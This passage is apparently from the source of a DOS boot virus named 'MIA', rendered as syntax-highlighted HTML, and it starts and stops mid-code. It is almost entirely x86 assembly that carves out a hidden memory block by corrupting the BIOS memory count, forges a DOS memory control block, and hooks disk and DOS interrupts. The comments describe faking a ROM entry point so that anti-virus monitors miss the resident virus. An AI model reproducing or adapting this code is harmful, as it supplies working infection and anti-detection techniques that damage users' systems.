 </span><span class="sc6">jns</span><span class="sc0">    </span><span class="sc5">Forfeit</span><span class="sc0">                </span><span class="sc1">; Branch if FD</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; CMOS RAM index 10h = floppy drive type</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; FDD was not present?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Forfeit</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0B8h</span><span class="sc0">

</span><span class="sc5">Spot</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; MOV AX,0014h</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Condition</span><span class="sc4">],</span><span class="sc2">0D7h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">048Fh</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Restore disk controller information (bugfix</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Enable_FDD</span><span class="sc0">             </span><span class="sc1">; for MAMMOTH.6000 virus??)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">04CCh</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒ[ Corrupts conventional memory and build hide-out ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; BIOS stores the amount of conventional memory (in KB) at 0040h:0013h, so as</span><span class="sc0">
</span><span class="sc1">; to allocate memory for MIA on bootup process, subtract the needed size from</span><span class="sc0">
</span><span class="sc1">; that word, but just because that word's in chunks of 1KB, the size of virus</span><span class="sc0">
</span><span class="sc1">; block must be rounded up,  this will create  an unused  gap in  DOS  memory</span><span class="sc0">
</span><span class="sc1">; chain later on,  to solve this problem,  MIA creates a free MCB  just below</span><span class="sc0">
</span><span class="sc1">; the virus block, this is the difference between  block  allocated on bootup</span><span class="sc0">
</span><span class="sc1">; process and MCB allocated after DOS loading process.</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Forfeit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dualmorphic</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0413h</span><span class="sc4">],</span><span class="sc10">Memory</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">12h</span><span class="sc0">                    </span><span class="sc1">; Get corrupted conventional memory size</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">                 </span><span class="sc1">; Convert it into segment</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">4Dh</span><span class="sc0">   </span><span class="sc1">; 'M' - DOS MCB signature</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Indicate a free block</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],((</span><span class="sc10">Memory</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VirPar</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc10">Memory</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VirPar</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; All words that have been read by boot-launcher</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Black_Hole</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Furbish</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">004Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get INT 13h vector into DS:DX</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">Furbish</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">; Disable interrupts</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; AX = zero</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; CX = number of words read by boot-launcher</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; DI = delta offset</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">                  </span><span class="sc1">; Wipe out all traces (ain't this necessary?)</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">               </span><span class="sc1">; Clear the vector of last 128 interrupts</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">                  </span><span class="sc1">; 'cause some BIOSes set SS:SP to 0000h:0400h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; on booting, and does not clear it before passing</span><span class="sc0">
                               </span><span class="sc1">; control to boot-record</span><span class="sc0">

</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Main interrupts hooking ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Uppercore</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C02Ah</span><span class="sc0">              </span><span class="sc1">; Opcode AX = SUB AL,AL ƒƒƒ AL=00</span><span class="sc0">
 </span><span class="sc6">jnp</span><span class="sc0">    </span><span class="sc5">Jived</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">                 </span><span class="sc1">; Opcode AX = XOR AL,AL ƒƒƒ AL=00</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Jived</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0D6F8h</span><span class="sc0">              </span><span class="sc1">; Opcode AX = CLC + SETALC ƒƒƒ AL=00</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Jived</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00B0h</span><span class="sc0">               </span><span class="sc1">; Opcode AX = MOV AL,00 ƒƒƒ AL=00</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Jived</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Ch</span><span class="sc0">                 </span><span class="sc1">; Opcode AX = AND AL,00 ƒƒƒ AL=00</span><span class="sc0">

</span><span class="sc5">Jived</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Replacement</span><span class="sc0">  </span><span class="sc1">; INT 24h handler buffer</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc0">                </span><span class="sc1">; IRET opcode</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
                               </span><span class="sc1">; Set up some stuff...</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Purport</span><span class="sc4">],</span><span class="sc2">0EBh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Rapidformat</span><span class="sc4">],</span><span class="sc2">0A8h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ROM_BIOS</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ROM_BIOS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirEnd</span><span class="sc4">],</span><span class="sc2">0EAh</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Transpire</span><span class="sc0">    </span><span class="sc1">; Install "new" INT 18h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">04F0h</span><span class="sc0">               </span><span class="sc1">; (0000h:04F0h) intra-application communication area</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">9Ah</span><span class="sc0">   </span><span class="sc1">; Far CALL opcode</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Biform</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; This will be far CALL to viral INT 40h handler</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">7Bh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Check number of installed HD</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0100h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Swap INT 40h vector</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0102h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Present</span><span class="sc0">                </span><span class="sc1">; Jump if there's one or more...</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ROM_BIOS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ROM_BIOS</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Present</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Flop_BIOS</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Flop_BIOS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Seeks an interrupt instruction (CD ??) in ROM to be used as a fake  INT 13h </span><span class="sc0">
</span><span class="sc1">; so all anti-viruses that monitor the vector of INT 13h will notify that the</span><span class="sc0">
</span><span class="sc1">; INT 13h vector still points out to a location in ROM ('cause the segment is</span><span class="sc0">
</span><span class="sc1">; C000h/F000h), only the offset differs. it'll look like the ROM entry point.</span><span class="sc0">
</span><span class="sc1">; MIA seeks the INT  number in range [78h..0FFh] to avoid interrupt conflicts</span><span class="sc0">
</span><span class="sc1">; (assume the interrupts in that range are not in use), points the INT to the</span><span class="sc0">
</span><span class="sc1">; viral INT 13h handler and then set the INT 13h offset. what anti-viruses do</span><span class="sc0">
</span><span class="sc1">; on booting is comparing the disk interrupt handler's segment with C000h, if</span><span class="sc0">
</span><span class="sc1">; below, they assume that the handler is located in RAM (it means that a boot</span><span class="sc0">
</span><span class="sc1">; virus was installed and is currently active). User will be alarmed for that</span><span class="sc0">
</span><span class="sc1">; and MIA ain't gonna like it, 8-)</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F000h</span><span class="sc0">              </span><span class="sc1">; AT ROM segment</span><span class="sc0">

</span><span class="sc5">Seek_XT</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cbw</span><span class="sc0">                           </span><span class="sc1">; AH = zero</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; SI = zero</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Interstice</span><span class="sc4">],</span><span class="sc2">00CDh</span><span class="sc0">  </span><span class="sc1">; Put INT 00h opcode</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Fake_ROM</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">SearchVector</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">26h</span><span class="sc0">                    </span><span class="sc1">; ES: prefix</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; SI = zero?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">FoundVector</span><span class="sc0">            </span><span class="sc1">; Jump if not</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C000h</span><span class="sc0">              </span><span class="sc1">; Try VROM segment, 8-)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; Not found at all?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Seek_XT</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Black_Hole</span><span class="sc0">   </span><span class="sc1">; Uh yeah, use old trick...</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Fling</span><span class="sc0">

</span><span class="sc5">FoundVector</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">                </span><span class="sc1">; INT opcode?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">SearchVector</span><span class="sc0">           </span><span class="sc1">; Nope, so seek again</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">26h</span><span class="sc0">                    </span><span class="sc1">; ES:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Load [SI] into AL</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc0">                 </span><span class="sc1">; MIA will only use the last 136 interrupts</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">SearchVector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Fake_ROM</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Save fake ROM interrupt</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; Now ES:[SI] points at an INT instruction</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dualform</span><span class="sc0">     </span><span class="sc1">; Then MIA sets the vector of that INT</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Hook fake ROM INT 13h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">Fling</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">FreeVector</span><span class="sc0">             </span><span class="sc1">; Obtain one of last 136 INTs randomly in AL</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Trapper</span><span class="sc0">      </span><span class="sc1">; DX holds MIA's INT 21h handler</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Interstice</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Hook INT 21h redirector</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


                       </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Abiistis</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dulces</span><span class="sc0"> </span><span class="sc5">caricae</span><span class="sc0">!


</span><span class="sc5">Dualmorphic</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Swap INT 13h now</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">FreeVector</span><span class="sc0">             </span><span class="sc1">; Obtain random interrupt in AL</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">                </span><span class="sc1">; INT opcode</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
